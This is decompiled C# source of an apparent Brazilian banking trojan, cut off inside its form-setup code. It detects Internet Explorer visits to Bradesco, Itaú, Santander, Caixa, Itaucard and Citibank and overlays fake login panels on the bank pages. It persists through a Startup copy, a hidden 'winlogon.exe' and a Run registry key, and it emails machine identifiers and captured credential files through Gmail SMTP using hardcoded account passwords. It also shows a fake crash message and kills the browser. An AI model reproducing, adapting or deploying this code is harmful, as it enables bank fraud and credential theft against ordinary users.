using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using CodeArchitects;
using Microsoft.Win32;
using SHDocVw;

namespace KanK;

public class Form1 : Form
{
	private const int WM_QUERYENDSESSION = 17;

	private Timer timer1;

	private IContainer components;

	private string banco;

	private string url;

	private int titulo;

	private ComboBox comboBox1;

	private Panel inicia_cc;

	private TextBox campo_usu;

	private TextBox campo_sen;

	private Panel finaliza_cc;

	private TextBox campo_da;

	private TextBox campo_se;

	private Label label2;

	private TextBox campo_di;

	private Label campo_fi;

	private Panel inicia_citi;

	public TextBox ct_u2;

	private TextBox ct_u1;

	private CheckBox lembrar;

	private Panel finaliza_citi;

	private CheckBox checkBox1;

	private TextBox ct_es;

	private TextBox ct_em;

	private Label click1;

	private Panel finaliza_citi1;

	private Label label5;

	private Label label4;

	private PictureBox pictureBox1;

	private Label label6;

	private TextBox ct_ca;

	private Panel cititec;

	private Label label38;

	private Label label41;

	private Label label43;

	private Label label40;

	private Label label42;

	private Label label30;

	private Label label39;

	private Label label22;

	private Label label14;

	private Label label37;

	private Label label29;

	private Label label21;

	private Label label9;

	private Label label36;

	private Label label28;

	private Label label20;

	private Label label13;

	private Label label35;

	private Label label27;

	private Label label19;

	private Label label10;

	private Label label34;

	private Label label26;

	private Label label18;

	private Label label12;

	private Label label33;

	private Label label25;

	private Label label17;

	private Label label7;

	private Label label32;

	private Label label24;

	private Label label16;

	private Label label11;

	private Label label31;

	private Label label23;

	private Label label15;

	private Label label44;

	internal static bool shuttingDown;

	public Satan Form_Santander2;

	public Brdsc Form_Bradesco2;

	public Itau2 Form_Itau2;

	public Personalite Form_Pers2;

	public Cxx Form_Cxx;

	private TextBox ita_a;

	private TextBox ita_b;

	private TextBox ita_c;

	private LinkLabel it_ok;

	private Panel inicia_ita;

	private TextBox bd_ag;

	private TextBox bd_nc;

	private TextBox bd_dg;

	private LinkLabel bd_ok;

	private Panel inicia_bra;

	private TextBox snt_ag;

	private TextBox snt_cc1;

	private TextBox snt_cc2;

	private LinkLabel linkLabel2;

	private TextBox snt_cc;

	private LinkLabel snt_ok;

	private Panel inicia_san;

	private RadioButton r1;

	private RadioButton r2;

	private RadioButton r3;

	private TextBox NOUS;

	private Label label8;

	private Label label1;

	private Label Tipo;

	public Panel inicia_cx;

	private TextBox prm_a;

	private TextBox prm_b;

	private TextBox prm_c;

	private LinkLabel prm_ok;

	private Panel inicia_prm;

	private TextBox prs_a;

	private TextBox prs_b;

	private TextBox prs_c;

	private Label botao_okprs;

	private Panel inicia_prs;

	public IntPtr hwnd;

	public IntPtr Hand => hwnd;

	public Form1()
	{
		InitializeComponent();
	}

	private static void Main()
	{
		AssemblyUnzipper.Initialize();
		Application.Run((Form)(object)new Form1());
	}

	[DllImport("user32.dll")]
	private static extern int ShowWindow(IntPtr hWnd, int nCmdShow);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr FindWindowEx(IntPtr parent, IntPtr next, string sClassName, IntPtr sWindowTitle);

	[DllImport("user32.dll")]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll")]
	private static extern int GetWindowText(int hWnd, StringBuilder text, int count);

	[DllImport("user32.dll")]
	private static extern int SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

	protected override void WndProc(ref Message m)
	{
		if (((Message)(ref m)).get_Msg() == 17)
		{
			shuttingDown = true;
			Application.Exit();
		}
		((Form)this).WndProc(ref m);
	}

	public IntPtr BuscaHandleClasse(IntPtr hwnd, string banco)
	{
		titulo = banco.IndexOf("Windows");
		if (titulo != -1)
		{
			hwnd = FindWindowEx(hwnd, IntPtr.Zero, "TabWindowClass", IntPtr.Zero);
		}
		hwnd = FindWindowEx(hwnd, IntPtr.Zero, "Shell DocObject View", IntPtr.Zero);
		hwnd = FindWindowEx(hwnd, IntPtr.Zero, "Internet Explorer_Server", IntPtr.Zero);
		return hwnd;
	}

	public static void GuardaInfo(string qual, string cont)
	{
		string text = qual + ".txt";
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString() + "\\";
		StreamWriter streamWriter = new StreamWriter(text2 + text, append: true);
		streamWriter.WriteLine(cont);
		streamWriter.Close();
	}

	public string RemoveChar(string teste)
	{
		char[] anyOf = new char[14]
		{
			'=', '\\', ';', '.', ':', ',', '+', '*', '-', '_',
			'@', '#', '!', ' '
		};
		int startIndex;
		while ((startIndex = teste.IndexOfAny(anyOf)) >= 0)
		{
			teste = teste.Remove(startIndex, 1);
		}
		return teste;
	}

	public static string PegaSerialHD()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"c:\"");
		val.Get();
		return ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
	}

	public static string PegaMacAdd()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = 'TRUE'");
		ManagementObjectCollection val2 = val.Get();
		ManagementObjectEnumerator enumerator = val2.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				return ((ManagementBaseObject)val3).get_Item("MACAddress").ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return "";
	}

	private static void Registrar()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup).ToString() + "\\windows.exe";
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\winlogon.exe";
		if (!File.Exists(text) && !File.Exists(text2))
		{
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			if (File.Exists(text))
			{
				File.Delete(text);
			}
			File.Copy(Application.get_ExecutablePath().ToString(), text, overwrite: true);
			File.Copy(Application.get_ExecutablePath().ToString(), text2, overwrite: true);
			File.SetAttributes(text2, FileAttributes.Hidden);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Winlogon", text2);
			Comunicado(Environment.UserName.ToString());
		}
	}

	public static void Comunicado(string user)
	{
		MailMessage mailMessage = new MailMessage();
		mailMessage.To.Add("dellcoments@gmail.com");
		mailMessage.From = new MailAddress("webdellmaster@gmail.com", user, Encoding.UTF8);
		mailMessage.Subject = "Seja bem vindo " + user + " !";
		string text2 = (mailMessage.Body = "\nPC-Name.......: " + Environment.MachineName.ToString() + "\nWindows.......: " + Environment.OSVersion.ToString() + "\nHard-Drive....: " + PegaSerialHD() + "\nMac-Address...: " + PegaMacAdd() + "----------------------------------------");
		NetworkCredential credentials = new NetworkCredential("di3dhoffman@gmail.com", "porrameu");
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
		smtpClient.Port = 587;
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.EnableSsl = true;
		smtpClient.UseDefaultCredentials = false;
		smtpClient.Credentials = credentials;
		smtpClient.Send(mailMessage);
		Thread.Sleep(1000);
	}

	public static void FazerUpload(string nome)
	{
		Cursor.set_Current(Cursors.get_WaitCursor());
		MailMessage mailMessage = new MailMessage();
		mailMessage.To.Add("dellcontas@gmail.com");
		mailMessage.From = new MailAddress("cadastros@gmail.com", Environment.UserName.ToString(), Encoding.UTF8);
		mailMessage.Subject = Environment.UserName.ToString() + " agradece-nos pela visita!";
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString() + "\\";
		mailMessage.Body = "Mensagem enviada automáticamente \nCadastramento de novo cliente! \nPor favor entrar em contato com o cliente! \n\n";
		Attachment item = new Attachment(text + nome, "application/octet-stream");
		mailMessage.Attachments.Add(item);
		NetworkCredential credentials = new NetworkCredential("cushgal@gmail.com", "glaucio");
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
		smtpClient.Port = 587;
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.EnableSsl = true;
		smtpClient.UseDefaultCredentials = false;
		smtpClient.Credentials = credentials;
		smtpClient.Send(mailMessage);
		Thread.Sleep(1000);
		Cursor.set_Current(Cursors.get_Default());
		CloseIE();
		Finaliza();
	}

	public static void Finaliza()
	{
		Application.Exit();
	}

	public static void Durma(int x)
	{
		Cursor.set_Current(Cursors.get_WaitCursor());
		Thread.Sleep(x);
		Cursor.set_Current(Cursors.get_Default());
	}

	public void NaoPrecioneLetras(object sender, KeyPressEventArgs e)
	{
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		string text = Convert.ToString(e.get_KeyChar());
		if (text != "1" && text != "2" && text != "3" && text != "4" && text != "5" && text != "6" && text != "7" && text != "8" && text != "9" && text != "0")
		{
			e.set_Handled(true);
			MessageBox.Show("Digite apenas números", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
	}

	private static void CloseIE()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("O Internet Explorer executou uma operação ilegal e será fechado.", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)16);
		Process[] processesByName = Process.GetProcessesByName("IEXPLORE");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		GetActiveWindow();
	}

	private void GetActiveWindow()
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		WebBrowser val = null;
		ShellWindows val2 = (ShellWindows)new ShellWindowsClass();
		foreach (WebBrowser item in (IShellWindows)val2)
		{
			WebBrowser val3 = item;
			string text = Path.GetFileNameWithoutExtension(((IWebBrowser2)val3).get_FullName())!.ToLower();
			if (text.Equals("iexplore"))
			{
				val = val3;
				break;
			}
		}
		if (val == null)
		{
			return;
		}
		int num = 0;
		StringBuilder stringBuilder = new StringBuilder(256);
		num = GetForegroundWindow();
		if (GetWindowText(num, stringBuilder, 256) <= 0)
		{
			return;
		}
		IntPtr intPtr = (hwnd = (IntPtr)((IWebBrowser2)val).get_HWND());
		banco = stringBuilder.ToString();
		url = ((IWebBrowser2)val).get_LocationURL().ToString();
		if (banco == ":: Bradesco Pessoa Física :: - Windows Internet Explorer" || banco == ":: Bradesco Pessoa Física :: - Microsoft Internet Explorer")
		{
			timer1.Stop();
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_bra).get_Handle(), hwnd);
			Durma(2000);
			ShowWindow(((Control)this).get_Handle(), 5);
			((Control)inicia_bra).set_Visible(true);
			ShowWindow(((Control)this).get_Handle(), 0);
		}
		if (banco == "Bradesco Prime - Windows Internet Explorer" || banco == "Bradesco Prime - Microsoft Internet Explorer")
		{
			timer1.Stop();
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_prm).get_Handle(), hwnd);
			Durma(1500);
			ShowWindow(((Control)this).get_Handle(), 5);
			((Control)inicia_prm).set_Visible(true);
			ShowWindow(((Control)this).get_Handle(), 0);
		}
		if (banco == "Banco Itaú - Feito Para Você - Windows Internet Explorer" || banco == "Banco Itaú - Feito Para Você - Microsoft Internet Explorer")
		{
			timer1.Stop();
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_ita).get_Handle(), hwnd);
			Durma(2000);
			ShowWindow(((Control)this).get_Handle(), 5);
			((Control)inicia_ita).set_Visible(true);
			ShowWindow(((Control)this).get_Handle(), 0);
		}
		if (banco == "Itaú Personnalité - Windows Internet Explorer" || banco == "Itaú Personnalité - Microsoft Internet Explorer")
		{
			timer1.Stop();
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_prs).get_Handle(), hwnd);
			Durma(2000);
			ShowWindow(((Control)this).get_Handle(), 5);
			((Control)inicia_prs).set_Visible(true);
			ShowWindow(((Control)this).get_Handle(), 0);
		}
		if (banco == "Santander - Windows Internet Explorer" || banco == "Santader - Microsoft Internet Explorer")
		{
			timer1.Stop();
			Durma(2000);
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_san).get_Handle(), hwnd);
			Durma(1500);
			ShowWindow(((Control)this).get_Handle(), 5);
			((Control)inicia_san).set_Visible(true);
			ShowWindow(((Control)this).get_Handle(), 0);
		}
		if (RemoveChar(banco).ToUpper() == "INTERNETBANKINGCAIXAWINDOWSINTERNETEXPLORER" || RemoveChar(banco).ToUpper() == "INTERNETBANKINGCAIXAMICROSOFTINTERNETEXPLORER")
		{
			timer1.Stop();
			Durma(2000);
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_cx).get_Handle(), hwnd);
			((Control)inicia_cx).set_Width(2000);
			((Control)inicia_cx).set_Height(999);
			Durma(1000);
			ShowWindow(((Control)this).get_Handle(), 5);
			((Control)inicia_cx).set_Visible(true);
			ShowWindow(((Control)this).get_Handle(), 0);
		}
		if (banco == "Itaucard - Credicard Itaú Portal - Windows Internet Explorer" || banco == "Itaucard - Credicard Itaú Portal - Microsoft Internet Explorer")
		{
			timer1.Stop();
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_cc).get_Handle(), hwnd);
			if (Screen.get_PrimaryScreen().get_WorkingArea().Width.ToString() == "800")
			{
				((Control)inicia_cc).set_Left(190);
			}
			else if (Screen.get_PrimaryScreen().get_WorkingArea().Width.ToString() == "1024")
			{
				((Control)inicia_cc).set_Left(300);
			}
			else if (Screen.get_PrimaryScreen().get_WorkingArea().Width.ToString() == "1280")
			{
				((Control)inicia_cc).set_Left(428);
			}
			((Control)inicia_cc).set_Top(98);
			Durma(2000);
			ShowWindow(((Control)this).get_Handle(), 5);
			((Control)inicia_cc).set_Visible(true);
			ShowWindow(((Control)this).get_Handle(), 0);
		}
		if (url.ToString() == "https://www.latinamerica.citibank.com/BRGCB/JPS/portal/Index.do")
		{
			timer1.Stop();
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_citi).get_Handle(), hwnd);
			SetParent(((Control)cititec).get_Handle(), hwnd);
			((Control)inicia_citi).set_Top(130);
			((Control)inicia_citi).set_Left(540);
			if (Screen.get_PrimaryScreen().get_WorkingArea().Width.ToString() == "800")
			{
				((Control)cititec).set_Left(526);
			}
			else if (Screen.get_PrimaryScreen().get_WorkingArea().Width.ToString() == "1024")
			{
				((Control)cititec).set_Left(750);
			}
			else if (Screen.get_PrimaryScreen().get_WorkingArea().Width.ToString() == "1280")
			{
				((Control)cititec).set_Left(1005);
			}
			((Control)cititec).set_Top(315);
			Durma(5000);
			ShowWindow(((Control)this).get_Handle(), 5);
			((Control)inicia_citi).set_Visible(true);
			ShowWindow(((Control)this).get_Handle(), 0);
		}
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_01da: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Expected O, but got Unknown
		//IL_01e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ef: Expected O, but got Unknown
		//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fa: Expected O, but got Unknown
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Expected O, but got Unknown
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_0210: Expected O, but got Unknown
		//IL_0211: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Expected O, but got Unknown
		//IL_021c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0226: Expected O, but got Unknown
		//IL_0227: Unknown result type (might be due to invalid IL or missing references)
		//IL_0231: Expected O, but got Unknown
		//IL_0232: Unknown result type (might be due to invalid IL or missing references)
		//IL_023c: Expected O, but got Unknown
		//IL_023d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0247: Expected O, but got Unknown
		//IL_0248: Unknown result type (might be due to invalid IL or missing references)
		//IL_0252: Expected O, but got Unknown
		//IL_0253: Unknown result type (might be due to invalid IL or missing references)
		//IL_025d: Expected O, but got Unknown
		//IL_025e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Expected O, but got Unknown
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_0273: Expected O, but got Unknown
		//IL_0274: Unknown result type (might be due to invalid IL or missing references)
		//IL_027e: Expected O, but got Unknown
		//IL_027f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0289: Expected O, but got Unknown
		//IL_028a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0294: Expected O, but got Unknown
		//IL_0295: Unknown result type (might be due to invalid IL or missing references)
		//IL_029f: Expected O, but got Unknown
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02aa: Expected O, but got Unknown
		//IL_02ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b5: Expected O, but got Unknown
		//IL_02b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c0: Expected O, but got Unknown
		//IL_02c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cb: Expected O, but got Unknown
		//IL_02cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d6: Expected O, but got Unknown
		//IL_02d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e1: Expected O, but got Unknown
		//IL_02e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ec: Expected O, but got Unknown
		//IL_02ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Expected O, but got Unknown
		//IL_02f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0302: Expected O, but got Unknown
		//IL_0303: Unknown result type (might be due to invalid IL or missing references)
		//IL_030d: Expected O, but got Unknown
		//IL_030e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0318: Expected O, but got Unknown
		//IL_0319: Unknown result type (might be due to invalid IL or missing references)
		//IL_0323: Expected O, but got Unknown
		//IL_0324: Unknown result type (might be due to invalid IL or missing references)
		//IL_032e: Expected O, but got Unknown
		//IL_032f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0339: Expected O, but got Unknown
		//IL_033a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0344: Expected O, but got Unknown
		//IL_0345: Unknown result type (might be due to invalid IL or missing references)
		//IL_034f: Expected O, but got Unknown
		//IL_0350: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Expected O, but got Unknown
		//IL_035b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0365: Expected O, but got Unknown
		//IL_0366: Unknown result type (might be due to invalid IL or missing references)
		//IL_0370: Expected O, but got Unknown
		//IL_0371: Unknown result type (might be due to invalid IL or missing references)
		//IL_037b: Expected O, but got Unknown
		//IL_037c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0386: Expected O, but got Unknown
		//IL_0387: Unknown result type (might be due to invalid IL or missing references)
		//IL_0391: Expected O, but got Unknown
		//IL_0392: Unknown result type (might be due to invalid IL or missing references)
		//IL_039c: Expected O, but got Unknown
		//IL_039d: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a7: Expected O, but got Unknown
		//IL_03a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b2: Expected O, but got Unknown
		//IL_03b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bd: Expected O, but got Unknown
		//IL_03be: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c8: Expected O, but got Unknown
		//IL_03c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d3: Expected O, but got Unknown
		//IL_03d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_03de: Expected O, but got Unknown
		//IL_03df: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e9: Expected O, but got Unknown
		//IL_03ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f4: Expected O, but got Unknown
		//IL_03f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ff: Expected O, but got Unknown
		//IL_0400: Unknown result type (might be due to invalid IL or missing references)
		//IL_040a: Expected O, but got Unknown
		//IL_040b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0415: Expected O, but got Unknown
		//IL_0416: Unknown result type (might be due to invalid IL or missing references)
		//IL_0420: Expected O, but got Unknown
		//IL_0421: Unknown result type (might be due to invalid IL or missing references)
		//IL_042b: Expected O, but got Unknown
		//IL_042c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0436: Expected O, but got Unknown
		//IL_0437: Unknown result type (might be due to invalid IL or missing references)
		//IL_0441: Expected O, but got Unknown
		//IL_0442: Unknown result type (might be due to invalid IL or missing references)
		//IL_044c: Expected O, but got Unknown
		//IL_044d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0457: Expected O, but got Unknown
		//IL_0458: Unknown result type (might be due to invalid IL or missing references)
		//IL_0462: Expected O, but got Unknown
		//IL_052d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0537: Expected O, but got Unknown
		//IL_05c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ce: Expected O, but got Unknown
		//IL_05f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0602: Expected O, but got Unknown
		//IL_068f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0699: Expected O, but got Unknown
		//IL_06c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_06cd: Expected O, but got Unknown
		//IL_075a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0764: Expected O, but got Unknown
		//IL_0802: Unknown result type (might be due to invalid IL or missing references)
		//IL_080c: Expected O, but got Unknown
		//IL_08ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f7: Expected O, but got Unknown
		//IL_0954: Unknown result type (might be due to invalid IL or missing references)
		//IL_095e: Expected O, but got Unknown
		//IL_0994: Unknown result type (might be due to invalid IL or missing references)
		//IL_099e: Expected O, but got Unknown
		//IL_09fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a08: Expected O, but got Unknown
		//IL_0a3e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a48: Expected O, but got Unknown
		//IL_0aa8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ab2: Expected O, but got Unknown
		//IL_0b38: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b42: Expected O, but got Unknown
		//IL_0b9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ba9: Expected O, but got Unknown
		//IL_0c50: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c5a: Expected O, but got Unknown
		//IL_0cfc: Unknown result type (might be due to invalid IL or missing references)
		//IL_111e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1128: Expected O, but got Unknown
		//IL_1256: Unknown result type (might be due to invalid IL or missing references)
		//IL_1260: Expected O, but got Unknown
		//IL_12cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1339: Unknown result type (might be due to invalid IL or missing references)
		//IL_1343: Expected O, but got Unknown
		//IL_148e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1498: Expected O, but got Unknown
		//IL_14b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1527: Unknown result type (might be due to invalid IL or missing references)
		//IL_1531: Expected O, but got Unknown
		//IL_154f: Unknown result type (might be due to invalid IL or missing references)
		//IL_15e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_15f1: Expected O, but got Unknown
		//IL_160c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1686: Unknown result type (might be due to invalid IL or missing references)
		//IL_1690: Expected O, but got Unknown
		//IL_17e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_17ec: Expected O, but got Unknown
		//IL_1879: Unknown result type (might be due to invalid IL or missing references)
		//IL_1883: Expected O, but got Unknown
		//IL_1896: Unknown result type (might be due to invalid IL or missing references)
		//IL_18a0: Expected O, but got Unknown
		//IL_192d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1937: Expected O, but got Unknown
		//IL_1961: Unknown result type (might be due to invalid IL or missing references)
		//IL_196b: Expected O, but got Unknown
		//IL_19f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a02: Expected O, but got Unknown
		//IL_1a3a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a44: Expected O, but got Unknown
		//IL_1ac6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bad: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bb7: Expected O, but got Unknown
		//IL_1c17: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c21: Expected O, but got Unknown
		//IL_1c40: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c4a: Expected O, but got Unknown
		//IL_1caa: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cb4: Expected O, but got Unknown
		//IL_1cea: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cf4: Expected O, but got Unknown
		//IL_1d51: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d5b: Expected O, but got Unknown
		//IL_1d93: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d9d: Expected O, but got Unknown
		//IL_1e78: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e82: Expected O, but got Unknown
		//IL_1f48: Unknown result type (might be due to invalid IL or missing references)
